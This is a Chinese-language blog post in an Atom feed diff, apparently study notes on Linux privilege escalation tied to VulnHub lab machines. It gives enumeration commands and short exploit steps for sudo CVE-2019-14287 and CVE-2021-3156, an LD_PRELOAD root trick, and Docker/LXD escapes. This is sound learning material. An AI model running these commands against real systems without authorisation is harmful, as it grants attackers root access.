+        </link>
+        <updated>2024-03-10T14:50:59.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<!-- more -->
+<h1 id="前言">前言</h1>
+<p>终于完整的把23的提权课程看完了 ，晚上也没什么事情  也不想学   来把之前学的整理整理</p>
+<p>一些基本指令</p>
+<pre><code>cat /etc/sudoers  谁被允许以root身份执行
+sudo -l       当前用户可以以root身份执行操作
+cat /etc/passwd     列出系统上的所有用户
+uname -a    打印所有可用的系统信息
+hostname    系统主机名
+ps aux  显示所有用户的进程同时显示用户名（包含未连接到终端的进程
+cat /etc/cron*   查看定时任务  
+
+SUID:  find / -perm -u=s -type f 2&gt;/dev/null 
+GUID:   find / -perm -g=s -type f 2&gt;/dev/null
+
+在known_hosts文件可以看到曾经连接过的所有主机公钥列表
+
+目标主机可能存在备份文件或其他网站服务的配置文件（.conf，.config，.xml，backup*，.bak等）和一些shell脚本或bash历史命令
+</code></pre>
+<h1 id="一些工具项目">一些工具项目</h1>
+<p>二进制文件提权查询：</p>
+<p>Linux：https://gtfobins.github.io/</p>
+<p>Windows：https://lolbas-project.github.io/</p>
+<p>信息收集  https://gthub.com/rebootuser/LinEnum   https://github.com/carlospolop/PEASS-ng</p>
+<h1 id="内核漏洞">内核漏洞</h1>
+<blockquote>
+<p>内核提权有风险，可能会导致目标主机崩溃</p>
+</blockquote>
+<p>可以直接从web -&gt;root</p>
+<h2 id="内核漏洞利用方法">内核漏洞利用方法</h2>
+<ol>
+<li>uname -a  获取关于目标系统的内核信息</li>
+<li>通过<code>exploit-db</code>或<code>searchsplopit</code>等 搜相关的exp</li>
+<li>通过<code>python3 -m http.server</code>或<code>wget</code>等服务将exp脚本传送至目标主机</li>
+<li>运行漏洞利用poc脚本（需要了解漏洞利用代码的工作原理，避免因为漏洞poc执行等原因对目标系统造成特殊的影响，或漏洞代码需要进行某些<strong>交互功能</strong>）</li>
+</ol>
+<h2 id="脏牛">脏牛</h2>
+<p>影响版本：Linux kernel &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p>
+<p>漏洞原理：在Linux内核的内存子系统处理私有只读内存映射的写时复制（COW）损坏的方式中发现了一种竞争状况。一个没有特权的本地用户可以使用此漏洞来获取对只读存储器映射的写访问权，从而增加他们在系统上的特权。</p>
+<p>exp :https://raw.githubusercontent.com/sqlnetcat/dirtycow-mem/master/dirtycow-mem.c</p>
+<p>​		https://github.com/dirtycow/dirtycow.github.io</p>
+<p>其他内核还有很多。。。。</p>
+<h2 id="参考靶机">参考靶机</h2>
+<p>https://www.vulnhub.com/entry/lampiao-1,249/<br>
+https://www.vulnhub.com/entry/darkhole-1,724/<br>
+https://www.vulnhub.com/entry/matrix-breakout-2-morpheus,757/</p>
+<p>https://www.vulnhub.com/entry/boredhackerblog-social-network,454/</p>
+<h1 id="suid">SUID</h1>
+<p>webshell  普通用户   ----&gt; root</p>
+<p>SUID (Set owner User ID up on execution)是给予文件的一个特殊类型的文件权限。在Linux/Unix中，当一个程序运行的时候，程序将从登录用户处继承权限。SUID被定义为给予一个用户临时的（程序/文件）所有者的权限来运行一个程序/文件。用户在执行程序/文件/命令的时候，将获取文件所有者的权限以及所有者的UID和GID。</p>
+<h2 id="漏洞成因">漏洞成因：</h2>
+<p>chmod u+s给予了suid        u-s删除suid</p>
+<p>使程序在运行中受到了suid root权限的执行过程导致</p>
+<h2 id="利用">利用：</h2>
+<p>去找对应的利用代码</p>
+<p>https://gtfobins.github.io/</p>
+<p>https://pentestlab.blog/?s=suid</p>
+<h2 id="参考靶机-2">参考靶机</h2>
+<p>https://www.vulnhub.com/entry/toppo-1,245/</p>
+<p>https://www.vulnhub.com/entry/dc-1,292/</p>
+<p>https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453</p>
+<h1 id="sudo">SUDO</h1>
+<p>本地用户权限   -&gt;   root</p>
+<p>SUDO权限是root把本来只能超级用户执行的命令赋予普通用户执行，系统管理员集中的管理用户使用权限和使用主机，配置文件：/etc/sudoers   除此配置之外的问题，SUDO还有两个CVE漏洞（CVE-2019-14287  CVE-2021-3156）</p>
+<p><code>cat /etc/sudoers</code>  看看哪些被赋予sudo  但是这个命令本身也需要root权限才。。(要看对方怎么设置的 )</p>
+<p><code>sudo -l</code> 命令用于列出当前用户在系统上可以执行的命令，以及对这些命令的授权情况</p>
+<p><code>sudo -V</code> 命令用于显示 sudo 命令的版本和配置信息</p>
+<h2 id="cve-2019-14287">CVE-2019-14287</h2>
+<p>https://blog.csdn.net/chest_/article/details/102716802</p>
+<p>sudo -l</p>
+<p>sudo -u#-1 sqlite3 /dev/null '.shell /bin/sh'</p>
+<h2 id="sudo-cve-2021-3156">sudo (CVE-2021-3156）</h2>
+<h3 id="版本">版本</h3>
+<p>sudo:  	1.8.2 - 1.8.31p2</p>
+<p>sudo:	 1.9.0 - 1.9.5p1</p>
+<h3 id="判断">判断</h3>
+<p>sudoedit -s /            报错即存在</p>
+<h3 id="利用-2">利用：</h3>
+<p>git clone https://github.com/blasty/CVE-2021-3156.git</p>
+<p>cd CVE-2021-3156</p>
+<p>make</p>
+<p>chmod a+x sudo-hax-me-a-sandwich</p>
+<p>./sudo-hax-me-a-sandwich  1             		   # uname -a  看	自己的内核</p>
+<h2 id="cve-2023-22809-sudo提权漏洞">CVE-2023-22809 sudo提权漏洞</h2>
+<p>https://mp.weixin.qq.com/s/uiAEnK5tqkKh0bqWPoTIKg</p>
+<h2 id="参考靶机-3">参考靶机</h2>
+<p>https://www.vulnhub.com/entry/devguru-1,620/</p>
+<p>https://www.vulnhub.com/entry/toppo-1,245/</p>
+<h1 id="cron">CRON</h1>
+<p>web 普通用户权限  ---&gt;root</p>
+<p>一般有两种情况</p>
+<ul>
+<li>查看定时任务  然后可以去修改定时任务里面的东西 			(权限给的有问题</li>
+<li>修改不了定时任务里面的东西(定时任务执行文件的内容)   就找定时任务执行文件有没有打包的操作   添加东西让他打包 然后就可以利用了        (很少</li>
+</ul>
+<p>https://www.vulnhub.com/entry/jarbas-1,232/   属于第一种</p>
+<h1 id="path">PATH</h1>
+<p>普通用户  ---&gt;  root</p>
+<h2 id="条件">条件：</h2>
+<p>ROOT用户对某个<strong>第三方程序</strong>给予了<strong>SUID</strong>权限</p>
+<p>find / -user root -perm -4000 -print 2&gt;/dev/null       看看哪个像是第三方程序</p>
+<h2 id="实战中的发现挖掘这类的安全问题">实战中的发现挖掘这类的安全问题  ：</h2>
+<p>1.先获取suid所有程序</p>
+<p>2.去除系统自带的一些命令（筛选<strong>第三方</strong>或者编译等的程序</p>
+<ol start="3">
+<li>下载这个程序 进行反编译或者找源代码  看运行结果 干了什么    (里面有没有可以利用的)</li>
+</ol>
+<p>4.思考程序有没有执行一些环境变量命令  (ps ping su sudo curl 等 )</p>
+<p>5.尝试通过复制suid提权的命令 （find bash 复制替换原有的执行命令（<strong>先添加环境变量</strong></p>
+<h2 id="操作">操作</h2>
+<p>参考之前的笔记 和靶机笔记     就是看看这个第三方程序运行执行了什么系统执行   再去添加环境变量</p>
+<h2 id="靶机">靶机</h2>
+<p>https://www.vulnhub.com/entry/symfonos-1,322/</p>
+<h1 id="nfs">NFS</h1>
+<p>NFS是一种基于TCP/IP 传输的网络文件系统协议，通过使用NFS协议，客户机可以像访问本地<strong>目录</strong>一样访问远程服务器中的<strong>共享资源</strong>。 文件的权限也互通的</p>
+<p>提升<strong>条件</strong>：NFS服务开启和web或用户权限进行利用</p>
+<p>nfs 传一个具有suid权限的文件  且可以弹shell的到kali的nfs目录   然后再去执行  	<strong>注意gcc编译机器与目标机内核版本相似</strong></p>
+<p>结合着vunlhub靶机 （https://www.vulnhub.com/entry/hacksudo-2-hackdudo,667/</p>
+<h1 id="capability能力">Capability能力</h1>
+<p>Web  普通用户  ----&gt;root</p>
+<p>跟suid差不多  就是这种root给用户的权限的时候给的细一些</p>
+<p>原理参考：https://www.cnblogs.com/f-carey/p/16026088.html</p>
+<p>去这里面找利用方法 https://gtfobins.github.io</p>
+<p>Hackerkid靶机https://www.jianshu.com/p/60673ac0454f</p>
+<h1 id="ld_preload加载">LD_Preload加载</h1>
+<p>普通用户  --&gt;root</p>
+<p>参考：https://www.cnblogs.com/backlion/p/10503985.html</p>
+<h2 id="条件-2">条件</h2>
+<ol>
+<li>赋予一个用户一些sudo权限             如: maomao  ALL=(ALL:ALL) NOPASSWD: /usr/bin/find</li>
+<li>Defaults        env_keep += LD_PRELOAD	添加以下内容作为默认配置来设置LD_preload的环境 这一步是关键</li>
+</ol>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403030951848.png" alt="image-20240303095106793" loading="lazy"></figure>
+<h2 id="操作-2">操作</h2>
+<p>将后门c文件编译 成 .so     .dll      再上传</p>
+<p>sudo LD_PRELOAD=/tmp/shell.so  find           这样去直接得到root</p>
+<h1 id="docker">Docker</h1>
+<p>普通用户---&gt;root</p>
+<p>分为两种情况</p>
+<p>第一种=&gt;你得到的shell是在docker里面  ，你先要把他逃逸出来   逃逸出来就可能成为第二种</p>
+<p>第二种=&gt;你得到的shell是在本机   而且用户在docker组里面       你先拉镜像 挂载真机的目录    你只可以读写那些本机root权限才可以读写的文件 (这个时候得到的权限并不是真机的root) 你这个时候去nc弹shell  得到的是docker 的root权限 又回到了docker当中    **你要真正的得到本机的root权限  修改定时任务   爆破shadow  (因为docker挂载真机的目录   你可以读写) 写ssh密钥到宿主机  CVE漏洞直接利用 **</p>
+<h2 id="条件-3">条件</h2>
+<p>用户属于docker组</p>
+<h2 id="靶机-2">靶机</h2>
+<p>详细笔记里有 就是</p>
+<p>https://www.vulnhub.com/entry/infovore-1,496/</p>
+<p>https://mp.weixin.qq.com/s/7RWgYGyiK-CEN508eB8BEg</p>
+<h1 id="rbash绕过">Rbash绕过</h1>
+<p>参考：https://xz.aliyun.com/t/7642</p>
+<p>Rbash(The Restricted mode of bash),也就是限制型bash  (很多命令都无法去执行 )</p>
+<p>在渗透测试中可能遇到rbash，尝试绕过后才能进行后续操作</p>
+<h1 id="lxd">LXD</h1>
+<p>普通用户---&gt;root</p>
+<h2 id="原理">原理：</h2>
+<p>LXD(Linux容器守护程序)是基于LXC容器的管理程序，当前用户可操作容器，理解为用户创建一个容器，再用容器挂载宿主机磁盘，最后使用容器权限操作宿主机磁盘内容达到提权效果。</p>
+<h2 id="条件-4">条件:</h2>
+<p>-已经获得Shell</p>
+<p>-<strong>用户属于lxd组</strong></p>
+<p>跟docker很像 挂载目录  得到可以访问root目录的权限</p>
+<p>https://www.vulnhub.com/entry/funbox-rookie,520/</p>
+<p>https://blog.csdn.net/elephantxiang/article/details/123974142</p>
+<h1 id="总结">总结</h1>
+<p>就写了个大概  具体的笔记里面写的很详细吧？</p>
+<p>我的是迪宝课上说滴   呜呜呜想学java了 但是还是得把眼前的东西搞完把  可能搞java 又搞得不想搞呜呜呜</p>
+<p>也可以看看https://xz.aliyun.com/t/11664</p>
+<figure data-type="image" tabindex="2"><img src="https://xiaomaoq.github.io//post-images/1710082293830.jpg" alt="" loading="lazy"></figure>
+]]></content>
+    </entry>
+</feed>
